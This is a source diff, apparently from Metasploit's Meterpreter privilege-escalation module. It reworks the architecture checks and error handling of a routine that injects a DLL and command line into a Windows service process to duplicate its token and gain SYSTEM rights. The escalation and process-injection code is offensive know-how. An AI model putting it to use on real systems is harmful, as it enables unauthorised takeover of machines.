@@ -50,7 +50,7 @@ BOOL elevate_priv( char * cpPrivilege, BOOL bEnable )
  * service process from a non elevated admin.
  *
  * A current limitation in LoadRemoteLibraryR prevents this from working across 
- * architectures so we just filter out running this from an x64 process for now.
+ * architectures so we just filter out running this from an x64 platform for now.
  */
 DWORD elevate_via_service_tokendup( Remote * remote, Packet * packet )
 {
@@ -73,25 +73,21 @@ DWORD elevate_via_service_tokendup( Remote * remote, Packet * packet )
 	DWORD index                      = 0;
 	DWORD dwServicesReturned         = 0;
 	DWORD dwExitCode                 = 0;
-#ifdef _WIN64
-	DWORD dwMeterpreterArch = 2;
-#else
-	DWORD dwMeterpreterArch = 1;
-#endif
 
 	do
 	{
+		// only works on x86 systems for now...
+		if( elevate_getnativearch() != PROCESS_ARCH_X86 )
+			BREAK_WITH_ERROR( "[KITRAP0D] elevate_via_service_debug. Unsuported platform", ERROR_BAD_ENVIRONMENT );
+
 		os.dwOSVersionInfoSize = sizeof( OSVERSIONINFO );
 
 		if( !GetVersionEx( &os ) )
 			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_debug: GetVersionEx failed" )
 
-		// filter out Windows NT4 or running this from native x64
-		if ( ( os.dwMajorVersion == 4 && os.dwMinorVersion == 0 ) || dwMeterpreterArch == 2 )
-		{
-			SetLastError( ERROR_ACCESS_DENIED );
-			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_debug: Not yet supported on this platform." )
-		}
+		// filter out Windows NT4 
+		if ( os.dwMajorVersion == 4 && os.dwMinorVersion == 0 )
+			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_debug: Not yet supported on this platform.", ERROR_BAD_ENVIRONMENT )
 
 		cpServiceName   = packet_get_tlv_value_string( packet, TLV_TYPE_ELEVATE_SERVICE_NAME );
 		dwServiceLength = packet_get_tlv_value_uint( packet, TLV_TYPE_ELEVATE_SERVICE_LENGTH );
@@ -145,7 +141,7 @@ DWORD elevate_via_service_tokendup( Remote * remote, Packet * packet )
 
 				dprintf( "[ELEVATE] elevate_via_service_debug. trying [%d] lpDisplayName=%s, lpServiceName=%s, dwProcessId=%d", index, lpServices[index].lpDisplayName, lpServices[index].lpServiceName, status.dwProcessId  );
 	
-				_snprintf( cCommandLine, sizeof(cCommandLine), "/t:%d\x00", GetCurrentThreadId() );
+				_snprintf( cCommandLine, sizeof(cCommandLine), "/t:0x%08X\x00", GetCurrentThreadId() );
 
 				// alloc some space and write the commandline which we will pass to the injected dll...
 				lpRemoteCommandLine = VirtualAllocEx( hProcess, NULL, strlen(cCommandLine)+1, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE ); 
